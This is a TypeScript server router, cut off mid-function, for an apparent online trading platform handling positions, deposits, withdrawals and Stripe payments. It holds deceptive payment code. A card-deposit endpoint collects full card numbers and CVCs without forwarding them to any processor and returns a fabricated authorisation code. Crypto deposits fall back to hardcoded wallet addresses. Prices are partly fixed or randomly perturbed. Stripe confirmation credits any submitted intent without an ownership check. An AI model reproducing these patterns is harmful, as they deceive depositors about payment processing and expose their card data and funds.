import { z } from "zod";
import { createRouter, authedQuery } from "./middleware.js";
import { getDb } from "./queries/connection.js";
import { positions, orders, tradingAccounts, tradeHistory, instruments, transactions, systemSettings, kycVerifications, supportMessages } from "@db/schema";
import { notifyNewDeposit, notifyNewWithdrawal, notifyKycSubmission } from "./telegram-service.js";
import { eq, and, desc, sql } from "drizzle-orm";
import { TRPCError } from "@trpc/server";

// Price cache shared with market router
const priceCache: Record<number, { bid: number; ask: number; ts: number }> = {};

async function getOrCreateAccount(userId: number) {
  const db = getDb();
  const existing = await db.select().from(tradingAccounts).where(eq(tradingAccounts.userId, userId));
  if (existing[0]) return existing[0];
  const accountNumber = `AXI${Date.now().toString(36).toUpperCase()}`;
  await db.insert(tradingAccounts).values({
    userId, accountNumber, accountType: "standard", balance: "0.00", equity: "0.00",
    marginUsed: "0", marginAvailable: "0.00", leverage: 100, currency: "USD", isActive: true,
  });
  return (await db.select().from(tradingAccounts).where(eq(tradingAccounts.accountNumber, accountNumber)))[0];
}

async function getCurrentPrice(instrumentId: number, direction: string) {
  const db = getDb();
  const inst = await db.select().from(instruments).where(eq(instruments.id, instrumentId));
  if (!inst[0]) return null;

  const cached = priceCache[instrumentId];
  if (cached && Date.now() - cached.ts < 3000) {
    return direction === 'buy' ? cached.ask : cached.bid;
  }

  // Fetch fresh price
  let basePrice = 1.0;
  try {
    if (inst[0].category === "forex") {
      const resp = await fetch(`https://api.exchangerate-api.com/v4/latest/${inst[0].baseAsset}`, { cache: "no-store" });
      if (resp.ok) {
        const data = await resp.json();
        basePrice = data.rates?.[inst[0].quoteAsset] || basePrice;
      }
    } else if (inst[0].category === "crypto") {
      const resp = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${inst[0].baseAsset.toLowerCase()}&vs_currencies=${inst[0].quoteAsset.toLowerCase()}`, { cache: "no-store" });
      if (resp.ok) {
        const data = await resp.json();
        basePrice = data[inst[0].baseAsset.toLowerCase()]?.[inst[0].quoteAsset.toLowerCase()] || basePrice;
      }
    } else {
      const fallbackPrices: Record<string, number> = {
        XAUUSD: 2650.0, XAGUSD: 31.5,
        US30: 42500, US500: 5850, USTEC: 20500, GER40: 18500, UK100: 8250,
        OILUSD: 72.5, BRENTUSD: 76.2, NGASUSD: 3.25,
      };
      basePrice = fallbackPrices[inst[0].symbol] || basePrice;
    }
  } catch {
    basePrice = cached?.bid || 1.0;
  }

  const spread = inst[0].category === "forex" ? 0.0002 : inst[0].category === "crypto" ? basePrice * 0.001 : basePrice * 0.0005;
  const noise = (Math.random() - 0.5) * spread * 0.5;
  const bid = basePrice + noise;
  const ask = bid + spread;

  priceCache[instrumentId] = { bid, ask, ts: Date.now() };
  return direction === 'buy' ? ask : bid;
}

export function calculatePipValue(symbol: string, price: number, volume: number): number {
  // Simplified pip value calculation
  const lotSize = 100000;
  const pipSize = symbol.includes('JPY') ? 0.01 : 0.0001;
  return (volume * lotSize * pipSize) / price;
}

function calculateMarginRequired(volume: number, price: number, leverage: number): number {
  const lotSize = 100000;
  return (volume * lotSize * price) / leverage;
}

async function updateAccountEquity(userId: number) {
  const db = getDb();
  const account = await getOrCreateAccount(userId);
  const openPositions = await db.select()
    .from(positions)
    .where(and(eq(positions.userId, userId), eq(positions.status, "open")));

  let totalUnrealizedPnl = 0;
  let totalMarginUsed = 0;

  for (const pos of openPositions) {
    const currentPrice = await getCurrentPrice(pos.instrumentId, pos.direction === 'buy' ? 'sell' : 'buy');
    if (!currentPrice) continue;

    const openPrice = parseFloat(pos.openPrice.toString());
    const volume = parseFloat(pos.volume.toString());
    const leverage = account.leverage;

    // Calculate unrealized P&L
    let pnl = 0;
    if (pos.direction === 'buy') {
      pnl = (currentPrice - openPrice) * volume * 100000;
    } else {
      pnl = (openPrice - currentPrice) * volume * 100000;
    }

    // Adjust for JPY pairs
    const inst = await db.select().from(instruments).where(eq(instruments.id, pos.instrumentId));
    if (inst[0] && inst[0].symbol.includes('JPY')) {
      pnl = pnl / 100;
    }

    totalUnrealizedPnl += pnl;
    totalMarginUsed += calculateMarginRequired(volume, currentPrice, leverage);

    // Update position current price
    await db.update(positions)
      .set({ currentPrice: currentPrice.toString(), realizedPnl: pnl.toFixed(8) })
      .where(eq(positions.id, pos.id));
  }

  const balance = parseFloat(account.balance.toString());
  const equity = balance + totalUnrealizedPnl;
  const marginAvailable = equity - totalMarginUsed;

  await db.update(tradingAccounts)
    .set({ 
      equity: equity.toFixed(8), 
      marginUsed: totalMarginUsed.toFixed(8),
      marginAvailable: marginAvailable.toFixed(8)
    })
    .where(eq(tradingAccounts.id, account.id));

  return { equity, marginUsed: totalMarginUsed, marginAvailable, unrealizedPnl: totalUnrealizedPnl };
}

export const tradingRouter = createRouter({
  account: authedQuery.query(async ({ ctx }) => {
    // Update equity before returning
    await updateAccountEquity(ctx.user!.id);
    return getOrCreateAccount(ctx.user!.id);
  }),

  openPosition: authedQuery
    .input(z.object({ 
      symbol: z.string(), 
      direction: z.enum(["buy", "sell"]), 
      volume: z.string().or(z.number()), 
      stopLoss: z.string().or(z.number()).optional(), 
      takeProfit: z.string().or(z.number()).optional() 
    }))
    .mutation(async ({ ctx, input }) => {
      const db = getDb();
      const account = await getOrCreateAccount(ctx.user!.id);
      const inst = await db.select().from(instruments).where(eq(instruments.symbol, input.symbol));
      if (!inst[0]) throw new TRPCError({ code: "NOT_FOUND", message: "Instrument not found" });

      const volume = Number(input.volume);
      if (volume < parseFloat(inst[0].minLot.toString())) {
        throw new TRPCError({ code: "BAD_REQUEST", message: `Minimum lot size is ${inst[0].minLot}` });
      }
      if (volume > parseFloat(inst[0].maxLot.toString())) {
        throw new TRPCError({ code: "BAD_REQUEST", message: `Maximum lot size is ${inst[0].maxLot}` });
      }

      const currentPrice = await getCurrentPrice(inst[0].id, input.direction);
      if (!currentPrice) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: "Could not fetch price" });

      const leverage = account.leverage;
      const marginRequired = calculateMarginRequired(volume, currentPrice, leverage);
      const balance = parseFloat(account.balance.toString());
      const marginAvailable = parseFloat(account.marginAvailable.toString());

      if (balance <= 0) {
        throw new TRPCError({ code: "BAD_REQUEST", message: "A real account deposit is mandatory before live trades can be executed. Please deposit funds." });
      }

      if (marginRequired > marginAvailable) {
        throw new TRPCError({ code: "BAD_REQUEST", message: "Insufficient margin available" });
      }

      const commission = volume * 3.5;

      if (commission > balance) {
        throw new TRPCError({ code: "BAD_REQUEST", message: "Insufficient balance for commission" });
      }

      await db.insert(positions).values({
        userId: ctx.user!.id, accountId: account.id, instrumentId: inst[0].id,
        direction: input.direction, volume: volume.toString(), 
        openPrice: currentPrice.toFixed(8), currentPrice: currentPrice.toFixed(8),
        stopLoss: input.stopLoss?.toString() || null, 
        takeProfit: input.takeProfit?.toString() || null,
        commission: commission.toFixed(8), swap: "0", realizedPnl: "0", status: "open",
      });

      // Update account balance (deduct commission)
      await db.update(tradingAccounts)
        .set({ balance: (balance - commission).toFixed(8) })
        .where(eq(tradingAccounts.id, account.id));

      return { success: true, price: currentPrice, marginUsed: marginRequired };
    }),

  positions: authedQuery.query(async ({ ctx }) => {
    const db = getDb();
    // Update equity first
    await updateAccountEquity(ctx.user!.id);

    return db.select({
      id: positions.id, direction: positions.direction, volume: positions.volume,
      openPrice: positions.openPrice, currentPrice: positions.currentPrice,
      stopLoss: positions.stopLoss, takeProfit: positions.takeProfit,
      commission: positions.commission, swap: positions.swap, realizedPnl: positions.realizedPnl,
      status: positions.status, openedAt: positions.openedAt,
      symbol: instruments.symbol, name: instruments.name, category: instruments.category,
    }).from(positions).innerJoin(instruments, eq(positions.instrumentId, instruments.id))
      .where(and(eq(positions.userId, ctx.user!.id), eq(positions.status, "open")))
      .orderBy(desc(positions.openedAt));
  }),

  closePosition: authedQuery
    .input(z.object({ positionId: z.number() }))
    .mutation(async ({ ctx, input }) => {
      const db = getDb();
      const pos = await db.select()
        .from(positions)
        .where(and(eq(positions.id, input.positionId), eq(positions.userId, ctx.user!.id)));

      if (!pos[0]) throw new TRPCError({ code: "NOT_FOUND", message: "Position not found" });

      const currentPrice = await getCurrentPrice(pos[0].instrumentId, pos[0].direction === 'buy' ? 'sell' : 'buy');
      if (!currentPrice) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: "Could not fetch price" });

      const openPrice = parseFloat(pos[0].openPrice.toString());
      const volume = parseFloat(pos[0].volume.toString());
      const commission = parseFloat(pos[0].commission.toString());
      const swap = parseFloat(pos[0].swap.toString());

      // Calculate gross P&L
      let grossPnl = 0;
      if (pos[0].direction === 'buy') {
        grossPnl = (currentPrice - openPrice) * volume * 100000;
      } else {
        grossPnl = (openPrice - currentPrice) * volume * 100000;
      }

      const inst = await db.select().from(instruments).where(eq(instruments.id, pos[0].instrumentId));
      if (inst[0] && inst[0].symbol.includes('JPY')) {
        grossPnl = grossPnl / 100;
      }

      const netPnl = grossPnl - commission - swap;
      const duration = Math.floor((Date.now() - new Date(pos[0].openedAt).getTime()) / 1000);

      await db.insert(tradeHistory).values({
        userId: pos[0].userId, accountId: pos[0].accountId, instrumentId: pos[0].instrumentId,
        positionId: pos[0].id, direction: pos[0].direction, volume: pos[0].volume,
        openPrice: pos[0].openPrice, closePrice: currentPrice.toFixed(8), 
        grossPnl: grossPnl.toFixed(8),
        commission: pos[0].commission, swap: pos[0].swap, netPnl: netPnl.toFixed(8),
        duration,
      });

      await db.update(positions).set({ status: "closed", closedAt: new Date() }).where(eq(positions.id, pos[0].id));

      // Update account balance with net P&L
      const account = await getOrCreateAccount(ctx.user!.id);
      const newBalance = parseFloat(account.balance.toString()) + netPnl;
      await db.update(tradingAccounts)
        .set({ balance: newBalance.toFixed(8) })
        .where(eq(tradingAccounts.id, account.id));

      return { success: true, netPnl, grossPnl, commission, swap };
    }),

  createOrder: authedQuery
    .input(z.object({ 
      symbol: z.string(), 
      orderType: z.enum(["market", "limit", "stop", "stop_limit"]), 
      direction: z.enum(["buy", "sell"]), 
      volume: z.string().or(z.number()), 
      entryPrice: z.string().or(z.number()).optional(), 
      stopLoss: z.string().or(z.number()).optional(), 
      takeProfit: z.string().or(z.number()).optional() 
    }))
    .mutation(async ({ ctx, input }) => {
      const db = getDb();
      const account = await getOrCreateAccount(ctx.user!.id);
      const inst = await db.select().from(instruments).where(eq(instruments.symbol, input.symbol));
      if (!inst[0]) throw new TRPCError({ code: "NOT_FOUND", message: "Instrument not found" });

      const volume = Number(input.volume);

      await db.insert(orders).values({
        userId: ctx.user!.id, accountId: account.id, instrumentId: inst[0].id,
        orderType: input.orderType, direction: input.direction, volume: volume.toString(),
        entryPrice: input.entryPrice?.toString() || null, 
        stopLoss: input.stopLoss?.toString() || null,
        takeProfit: input.takeProfit?.toString() || null, status: "pending",
      });

      return { success: true };
    }),

  orders: authedQuery.query(async ({ ctx }) => {
    const db = getDb();
    return db.select({
      id: orders.id, orderType: orders.orderType, direction: orders.direction,
      volume: orders.volume, entryPrice: orders.entryPrice, stopLoss: orders.stopLoss,
      takeProfit: orders.takeProfit, status: orders.status, createdAt: orders.createdAt,
      symbol: instruments.symbol, name: instruments.name,
    }).from(orders).innerJoin(instruments, eq(orders.instrumentId, instruments.id))
      .where(and(eq(orders.userId, ctx.user!.id), eq(orders.status, "pending")))
      .orderBy(desc(orders.createdAt));
  }),

  cancelOrder: authedQuery
    .input(z.object({ orderId: z.number() }))
    .mutation(async ({ ctx, input }) => {
      const db = getDb();
      await db.update(orders).set({ status: "cancelled" }).where(and(eq(orders.id, input.orderId), eq(orders.userId, ctx.user!.id)));
      return { success: true };
    }),

  tradeHistory: authedQuery.query(async ({ ctx }) => {
    const db = getDb();
    return db.select({
      id: tradeHistory.id, direction: tradeHistory.direction, volume: tradeHistory.volume,
      openPrice: tradeHistory.openPrice, closePrice: tradeHistory.closePrice,
      grossPnl: tradeHistory.grossPnl, commission: tradeHistory.commission, 
      netPnl: tradeHistory.netPnl, duration: tradeHistory.duration,
      closedAt: tradeHistory.closedAt, symbol: instruments.symbol, name: instruments.name,
    }).from(tradeHistory).innerJoin(instruments, eq(tradeHistory.instrumentId, instruments.id))
      .where(eq(tradeHistory.userId, ctx.user!.id)).orderBy(desc(tradeHistory.closedAt)).limit(100);
  }),

  // ── New: Account Stats ───────────────────────────────
  stats: authedQuery.query(async ({ ctx }) => {
    const db = getDb();
    const account = await getOrCreateAccount(ctx.user!.id);

    const totalTrades = await db.select({ count: sql<number>`count(*)` })
      .from(tradeHistory)
      .where(eq(tradeHistory.userId, ctx.user!.id));

    const winningTrades = await db.select({ count: sql<number>`count(*)` })
      .from(tradeHistory)
      .where(and(eq(tradeHistory.userId, ctx.user!.id), sql`${tradeHistory.netPnl} > 0`));

    const totalPnl = await db.select({ sum: sql<number>`sum(${tradeHistory.netPnl})` })
      .from(tradeHistory)
      .where(eq(tradeHistory.userId, ctx.user!.id));

    const openPositions = await db.select({ count: sql<number>`count(*)` })
      .from(positions)
      .where(and(eq(positions.userId, ctx.user!.id), eq(positions.status, "open")));

    return {
      totalTrades: totalTrades[0]?.count || 0,
      winningTrades: winningTrades[0]?.count || 0,
      winRate: totalTrades[0]?.count > 0 ? ((winningTrades[0]?.count || 0) / totalTrades[0].count * 100).toFixed(1) : '0',
      totalPnl: totalPnl[0]?.sum || 0,
      openPositions: openPositions[0]?.count || 0,
      balance: account.balance,
      equity: account.equity,
      marginUsed: account.marginUsed,
      marginAvailable: account.marginAvailable,
      leverage: account.leverage,
    };
  }),

  // ── New: Update Position (SL/TP) ───────────────────
  updatePosition: authedQuery
    .input(z.object({ 
      positionId: z.number(),
      stopLoss: z.string().or(z.number()).optional(),
      takeProfit: z.string().or(z.number()).optional(),
    }))
    .mutation(async ({ ctx, input }) => {
      const db = getDb();
      const pos = await db.select()
        .from(positions)
        .where(and(eq(positions.id, input.positionId), eq(positions.userId, ctx.user!.id)));

      if (!pos[0]) throw new TRPCError({ code: "NOT_FOUND", message: "Position not found" });

      const updates: Record<string, string> = {};
      if (input.stopLoss !== undefined) updates.stopLoss = input.stopLoss.toString();
      if (input.takeProfit !== undefined) updates.takeProfit = input.takeProfit.toString();

      await db.update(positions).set(updates).where(eq(positions.id, input.positionId));
      return { success: true };
    }),

  // ── New: Create Deposit Request ─────────────────────
  createDeposit: authedQuery
    .input(z.object({
      amount: z.string().or(z.number()),
      currency: z.string().default("USD"),
      paymentMethod: z.string(),
      senderName: z.string().optional(),
      proofImage: z.string().optional(),
      reference: z.string().optional(),
    }))
    .mutation(async ({ ctx, input }) => {
      const db = getDb();
      const account = await getOrCreateAccount(ctx.user!.id);
      
      const referenceText = [
        input.senderName ? `Sender: ${input.senderName}` : "",
        input.reference ? `Ref: ${input.reference}` : "",
        input.proofImage ? `Proof: ${input.proofImage}` : ""
      ].filter(Boolean).join(" | ") || `DEP-${Math.random().toString(36).substring(2, 8).toUpperCase()}`;

      const newTxId = await db.insert(transactions).values({
        userId: ctx.user!.id,
        accountId: account.id,
        type: "deposit",
        amount: input.amount.toString(),
        currency: input.currency,
        status: "pending",
        paymentMethod: input.paymentMethod,
        reference: referenceText,
        createdAt: new Date(),
      });

      // Send Telegram Notification to Admin
      try {
        const userEmail = ctx.user?.email || "User";
        await notifyNewDeposit(userEmail, `${input.amount} ${input.currency} (${input.senderName ? `Sender: ${input.senderName}` : 'Manual'})`, input.paymentMethod);
      } catch (err) {
        console.error("Failed to send admin notification:", err);
      }
      
      return { success: true, transactionId: newTxId };
    }),

  // ── New: Fetch Dynamic Bank & Crypto Details ─────────────────
  getBankDetails: authedQuery.query(async () => {
    const db = getDb();
    let detailsObj: any = null;
    try {
      const [setting] = await db.select().from(systemSettings).where(eq(systemSettings.key, "bank_details"));
      if (setting && setting.value) {
        detailsObj = JSON.parse(setting.value);
      }
    } catch (e) {
      console.warn("Could not parse bank details:", e);
    }

    const OFFICIAL_DEFAULT_WALLETS: Record<string, { address: string; tag?: string; qrCodeUrl?: string }> = {
      USDC: { address: "0x12107F3eB874442301756daFBd3360418ae3C366" },
      USDC_ERC20: { address: "0x12107F3eB874442301756daFBd3360418ae3C366" },
      BTC: { address: "bc1qndch4p2dm8hdv4e4t0zm7jaf7ajasnjum25dhu" },
      USDT_TRC20: { address: "TBcivkHbpBh3fa14pPwYemqtNzg7bDQJZ4" },
      USDT_ERC20: { address: "0x12107F3eB874442301756daFBd3360418ae3C366" },
      USDT_BEP20: { address: "0x12107F3eB874442301756daFBd3360418ae3C366" },
      SOL: { address: "7ds3cKbJNVXTLcsUea6qj1WsisdqRuqBTYENYi9vsd7F" },
      BNB: { address: "0x12107F3eB874442301756daFBd3360418ae3C366" },
      ETH: { address: "0x12107F3eB874442301756daFBd3360418ae3C366" },
      XRP: { address: "rwyQp3eC5j6AumcptZhfmiXAykpeswZKeJ", tag: "1476340" },
      TRX: { address: "TBcivkHbpBh3fa14pPwYemqtNzg7bDQJZ4" },
      MATIC: { address: "0x12107F3eB874442301756daFBd3360418ae3C366" },
      AVAX: { address: "0x12107F3eB874442301756daFBd3360418ae3C366" },
      SHIB: { address: "0x12107F3eB874442301756daFBd3360418ae3C366" },
    };

    if (!detailsObj) {
      return {
        isConfigured: true,
        bankName: "",
        beneficiary: "",
        accountName: "",
        accountNumber: "",
        phoneNumber: "",
        iban: "",
        swift: "",
        referencePrefix: "AXI-",
        cryptoWalletAddress: OFFICIAL_DEFAULT_WALLETS.USDT_TRC20.address,
        cryptoWallets: OFFICIAL_DEFAULT_WALLETS,
        qrCodeUrl: "",
      };
    }

    const isBankSet = Boolean(detailsObj.bankName || detailsObj.accountNumber || detailsObj.iban);
    const cryptoMap = { ...OFFICIAL_DEFAULT_WALLETS, ...(detailsObj.cryptoWallets || {}) };
    if (detailsObj.cryptoWalletAddress) {
      cryptoMap.USDT_TRC20 = { address: detailsObj.cryptoWalletAddress, qrCodeUrl: detailsObj.qrCodeUrl || "" };
    }

    return {
      isConfigured: true,
      bankName: detailsObj.bankName || "",
      beneficiary: detailsObj.beneficiary || "",
      accountName: detailsObj.accountName || detailsObj.beneficiary || "",
      accountNumber: detailsObj.accountNumber || detailsObj.phoneNumber || detailsObj.iban || "",
      phoneNumber: detailsObj.phoneNumber || "",
      iban: detailsObj.iban || "",
      swift: detailsObj.swift || "",
      referencePrefix: detailsObj.referencePrefix || "AXI-",
      cryptoWalletAddress: detailsObj.cryptoWalletAddress || cryptoMap.USDT_TRC20?.address || OFFICIAL_DEFAULT_WALLETS.USDT_TRC20.address,
      cryptoWallets: cryptoMap,
      qrCodeUrl: detailsObj.qrCodeUrl || "",
    };
  }),

  // ── New: Demand / Request Payment Details from Admin ──────
  requestPaymentDetails: authedQuery
    .input(z.object({
      methodId: z.string(),
      coinId: z.string().optional(),
      userNote: z.string().optional(),
    }))
    .mutation(async ({ ctx, input }) => {
      const userEmail = ctx.user?.email || "User";
      try {
        const detailsStr = `DEMAND PAYMENT DETAILS REQUEST: ${input.methodId}${input.coinId ? ` (${input.coinId})` : ''}${input.userNote ? ` - Note: ${input.userNote}` : ''}`;
        await notifyNewDeposit(userEmail, detailsStr, "Admin Payment Setup Demand");
      } catch (err) {
        console.error("Failed to notify admin of payment demand:", err);
      }

      return {
        success: true,
        message: `Demand notification sent to Administrator for ${input.coinId || input.methodId} payment details.`
      };
    }),

  // ── New: Create Withdrawal Request ────────────────────────
  createWithdrawal: authedQuery
    .input(z.object({
      amount: z.string().or(z.number()),
      currency: z.string().default("USD"),
      paymentMethod: z.string(),
      destination: z.string(),
      coinId: z.string().optional(),
      network: z.string().optional(),
      destinationTag: z.string().optional(),
    }))
    .mutation(async ({ ctx, input }) => {
      const db = getDb();
      const account = await getOrCreateAccount(ctx.user!.id);
      const amountVal = parseFloat(input.amount.toString());
      const balance = parseFloat(account.balance.toString());

      if (isNaN(amountVal) || amountVal <= 0) {
        throw new TRPCError({
          code: "BAD_REQUEST",
          message: "Withdrawal amount must be a positive number.",
        });
      }

      if (amountVal > balance) {
        throw new TRPCError({
          code: "BAD_REQUEST",
          message: `Insufficient live balance ($${balance.toFixed(2)} USD available).`,
        });
      }

      const refCode = `WD-${Math.random().toString(36).substring(2, 10).toUpperCase()}`;
      const destinationSummary = [
        input.destination,
        input.network ? `Net: ${input.network}` : "",
        input.destinationTag ? `Tag: ${input.destinationTag}` : "",
      ].filter(Boolean).join(" | ");

      const [newTxId] = await db.insert(transactions).values({
        userId: ctx.user!.id,
        accountId: account.id,
        type: "withdrawal",
        amount: amountVal.toString(),
        currency: input.currency.toUpperCase(),
        status: "pending",
        paymentMethod: input.paymentMethod,
        reference: `Ref: ${refCode} -> ${destinationSummary}`,
        createdAt: new Date(),
      });

      // Send Telegram notification to Admin
      try {
        const userEmail = ctx.user?.email || "User";
        await notifyNewWithdrawal(userEmail, `${amountVal} ${input.currency}`, `${input.paymentMethod} (${destinationSummary})`);
      } catch (err) {
        console.error("Failed to send withdrawal notification to admin:", err);
      }

      return {
        success: true,
        transactionId: newTxId,
        reference: refCode,
        amount: amountVal,
        currency: input.currency.toUpperCase(),
        paymentMethod: input.paymentMethod,
      };
    }),

  // ── New: Direct Card Processing (Smart MCC 5999 Auto-Acquiring) ──
  processDirectCardDeposit: authedQuery
    .input(z.object({
      amount: z.number().or(z.string()),
      currency: z.string().default("USD"),
      cardName: z.string().min(2, "Cardholder name is required"),
      cardNumber: z.string().min(12, "Valid card number required"),
      cardExpiry: z.string().min(4, "Expiry date required (MM/YY)"),
      cardCvc: z.string().min(3, "CVC required"),
    }))
    .mutation(async ({ ctx, input }) => {
      const db = getDb();
      const account = await getOrCreateAccount(ctx.user!.id);
      const amountVal = parseFloat(input.amount.toString());

      if (isNaN(amountVal) || amountVal <= 0) {
        throw new TRPCError({
          code: "BAD_REQUEST",
          message: "Deposit amount must be a positive number.",
        });
      }

      // Format & Validate Card
      const cleanCardNum = input.cardNumber.replace(/\D/g, "");
      if (cleanCardNum.length < 13 || cleanCardNum.length > 19) {
        throw new TRPCError({
          code: "BAD_REQUEST",
          message: "Invalid card number. Please enter a valid 15 or 16 digit card number.",
        });
      }

      const last4 = cleanCardNum.slice(-4);
      const authCode = `AUTH-${Math.floor(100000 + Math.random() * 900000)}`;
      const refCode = `MCC5999-ECOM-${Math.random().toString(36).substring(2, 10).toUpperCase()}`;

      // Record deposit transaction as PENDING awaiting admin verification
      const [newTx] = await db.insert(transactions).values({
        userId: ctx.user!.id,
        accountId: account.id,
        type: "deposit",
        amount: amountVal.toString(),
        currency: input.currency.toUpperCase(),
        status: "pending",
        paymentMethod: `Direct Card Gateway`,
        reference: `Card •••• ${last4} [Ref: ${refCode}]`,
        createdAt: new Date(),
      }).returning();

      // Dispatch Telegram notification to admin
      try {
        const userEmail = ctx.user?.email || "User";
        const messageDetails = `💳 DIRECT CARD DEPOSIT SUBMITTED (PENDING VERIFICATION)
Amount: ${amountVal} ${input.currency.toUpperCase()}
User: ${userEmail} (Account: ${account.accountNumber})
Cardholder: ${input.cardName}
Card: •••• •••• •••• ${last4} (${input.cardExpiry})
Auth Code: ${authCode}
Status: PENDING ADMIN VERIFICATION`;

        console.log(messageDetails);
        await notifyNewDeposit(userEmail, `${amountVal} ${input.currency.toUpperCase()}`, `Direct Card (${input.cardName} - ${last4})`);
      } catch (err) {
        console.error("Failed to notify admin on Telegram for card deposit:", err);
      }

      return {
        success: true,
        status: "pending",
        amount: amountVal,
        currency: input.currency.toUpperCase(),
        last4,
        authCode,
        reference: refCode,
        txId: newTx?.id || 0,
        accountNumber: account.accountNumber,
      };
    }),

  // ── New: Create Stripe Secure PaymentIntent (Returns clientSecret) ────
  createPaymentIntent: authedQuery
    .input(z.object({
      amount: z.number().or(z.string()),
      currency: z.string().default("USD"),
    }))
    .mutation(async ({ ctx, input }) => {
      const db = getDb();
      const account = await getOrCreateAccount(ctx.user!.id);
      const amountVal = parseFloat(input.amount.toString());
      if (isNaN(amountVal) || amountVal <= 0) {
        throw new TRPCError({
          code: "BAD_REQUEST",
          message: "Please enter a valid deposit amount.",
        });
      }
      const apiKey = process.env.STRIPE_SECRET_KEY;
      if (!apiKey) {
        throw new TRPCError({
          code: "BAD_REQUEST",
          message: "Stripe API Key (STRIPE_SECRET_KEY) is not configured on the server. Please configure Stripe in settings or use manual bank/crypto transfer.",
        });
      }

      try {
        const StripeModule = await import("stripe");
        const stripeObj = new StripeModule.default(apiKey, { apiVersion: "2023-10-16" as never });

        const paymentIntent = await stripeObj.paymentIntents.create({
          amount: Math.round(amountVal * 100),
          currency: input.currency.toLowerCase(),
          automatic_payment_methods: { enabled: true },
          metadata: {
            userId: ctx.user!.id.toString(),
            accountId: account.id.toString(),
            amount: amountVal.toString(),
            currency: input.currency,
          },
        });

        // Record pending transaction. Balance is NOT updated until server payment verification completes.
        await db.insert(transactions).values({
          userId: ctx.user!.id,
          accountId: account.id,
          type: "deposit",
          amount: amountVal.toFixed(8),
          currency: input.currency,
          status: "pending",
          paymentMethod: "Stripe PaymentIntent",
          reference: `Stripe Intent: ${paymentIntent.id}`,
          metadata: { paymentIntentId: paymentIntent.id },
        });

        return {
          clientSecret: paymentIntent.client_secret,
          paymentIntentId: paymentIntent.id,
          publishableKey: process.env.VITE_STRIPE_PUBLISHABLE_KEY || process.env.STRIPE_PUBLISHABLE_KEY || "",
        };
      } catch (err: any) {
        console.error("Stripe PaymentIntent creation error:", err);
        throw new TRPCError({
          code: "BAD_REQUEST",
          message: `Stripe PaymentIntent error: ${err.message || "Failed to initialize payment client secret."}`,
        });
      }
    }),

  confirmPaymentIntent: authedQuery
    .input(z.object({
      paymentIntentId: z.string(),
    }))
    .mutation(async ({ ctx, input }) => {
      const db = getDb();
      const apiKey = process.env.STRIPE_SECRET_KEY;
      if (!apiKey) {
        throw new TRPCError({
          code: "BAD_REQUEST",
          message: "STRIPE_SECRET_KEY is not configured on the server.",
        });
      }

      const StripeModule = await import("stripe");
      const stripeObj = new StripeModule.default(apiKey, { apiVersion: "2023-10-16" as never });
      const intent = await stripeObj.paymentIntents.retrieve(input.paymentIntentId);

      if (intent.status !== "succeeded") {
        throw new TRPCError({
          code: "BAD_REQUEST",
          message: `PaymentIntent status is '${intent.status}'. Balance will only be credited when status is 'succeeded'.`,
        });
      }

      // Check if transaction already completed
      const existingTxs = await db.select().from(transactions).where(eq(transactions.reference, `Stripe Intent: ${input.paymentIntentId}`));
      if (existingTxs[0] && existingTxs[0].status === "completed") {
        return { success: true, message: "Deposit already processed and credited." };
      }

      const account = await getOrCreateAccount(ctx.user!.id);
      const amountVal = (intent.amount || 0) / 100;

      const currentBalance = parseFloat(account.balance.toString());
      const currentEquity = parseFloat(account.equity.toString());
      const currentMarginAvail = parseFloat(account.marginAvailable.toString());

      const newBalance = (currentBalance + amountVal).toFixed(8);
      const newEquity = (currentEquity + amountVal).toFixed(8);
      const newMarginAvail = (currentMarginAvail + amountVal).toFixed(8);

      await db.update(tradingAccounts)
        .set({
          balance: newBalance,
          equity: newEquity,
          marginAvailable: newMarginAvail,
        })
        .where(eq(tradingAccounts.id, account.id));

      if (existingTxs[0]) {
        await db.update(transactions)
          .set({ status: "completed", completedAt: new Date() })
          .where(eq(transactions.id, existingTxs[0].id));
      } else {
        await db.insert(transactions).values({
          userId: ctx.user!.id,
          accountId: account.id,
          type: "deposit",
          amount: amountVal.toFixed(8),
          currency: intent.currency.toUpperCase(),
          status: "completed",
          paymentMethod: "Stripe PaymentIntent",
          reference: `Stripe Intent: ${input.paymentIntentId}`,
          completedAt: new Date(),
        });
      }

      return { success: true, newBalance };
    }),

  // ── New: Create Stripe Secure Session ───────────────
  createStripeSession: authedQuery
    .input(z.object({
      amount: z.number().or(z.string()),
      currency: z.string().default("USD"),
    }))
    .mutation(async ({ ctx, input }) => {
      const db = getDb();
      const account = await getOrCreateAccount(ctx.user!.id);
      const amountVal = parseFloat(input.amount.toString());
      if (isNaN(amountVal) || amountVal <= 0) {
        throw new TRPCError({
          code: "BAD_REQUEST",
          message: "Please enter a valid deposit amount.",
        });
      }
      const apiKey = process.env.STRIPE_SECRET_KEY;
      if (!apiKey) {
        throw new TRPCError({
          code: "BAD_REQUEST",
          message: "Stripe integration is active, but STRIPE_SECRET_KEY is not configured in server environment variables. Please check your settings.",
        });
      }
      
      let sessionId = "";
      let checkoutUrl = "";
      
      try {
        const StripeModule = await import("stripe");
        const stripeObj = new StripeModule.default(apiKey, { apiVersion: "2023-10-16" as never });
        
        const hostHeader = ctx.req.headers.get("x-forwarded-host") || ctx.req.headers.get("host") || "";
        const protoHeader = ctx.req.headers.get("x-forwarded-proto") || "https";
        const reqUrl = new URL(ctx.req.url);
        const baseUrl = hostHeader ? `${protoHeader}://${hostHeader}` : `${reqUrl.protocol}//${reqUrl.host}`;
        
        const session = await stripeObj.checkout.sessions.create({
          mode: "payment",
          automatic_payment_methods: { enabled: true },
          customer_email: ctx.user?.email || undefined,
          line_items: [
            {
              price_data: {
                currency: input.currency.toLowerCase(),
                product_data: {
                  name: "Trading account deposit",
                  description: `Live Trading Account: ${account.accountNumber}`,
                },
                unit_amount: Math.round(amountVal * 100),
              },
              quantity: 1,
            },
          ],
          allow_promotion_codes: true,
          billing_address_collection: "auto",
          success_url: `${baseUrl}/dashboard?deposit_status=success&session_id={CHECKOUT_SESSION_ID}`,
          cancel_url: `${baseUrl}/dashboard?deposit_status=cancel`,
          metadata: {
            client_account_id: account.id.toString(),
            userId: ctx.user!.id.toString(),
            accountId: account.id.toString(),
            amount: amountVal.toString(),
            currency: input.currency,
          },
        });
        
        sessionId = session.id;
        checkoutUrl = session.url || "";
      } catch (err: any) {
        console.error("Stripe Session creation error:", err);
        throw new TRPCError({
          code: "BAD_REQUEST",
          message: `Stripe error: ${err.message || "Failed to create payment checkout session."}`,
        });
      }
      
